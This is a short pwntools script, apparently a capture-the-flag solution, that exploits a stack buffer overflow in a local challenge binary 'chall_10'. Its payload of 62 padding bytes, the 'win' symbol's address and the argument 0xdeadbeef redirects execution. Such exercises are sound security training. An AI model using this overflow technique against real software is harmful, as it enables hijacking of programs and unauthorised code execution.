from pwn import *

def main():
	binary = context.binary = ELF("./chall_10")
	p = process("./chall_10")
	print(p.recv())
	p.sendline()
	payload = (62 * "A").encode() + p32(binary.sym.win) + p32(0) + p32(3735928559)
	p.sendline(payload)
	p.interactive()
main()
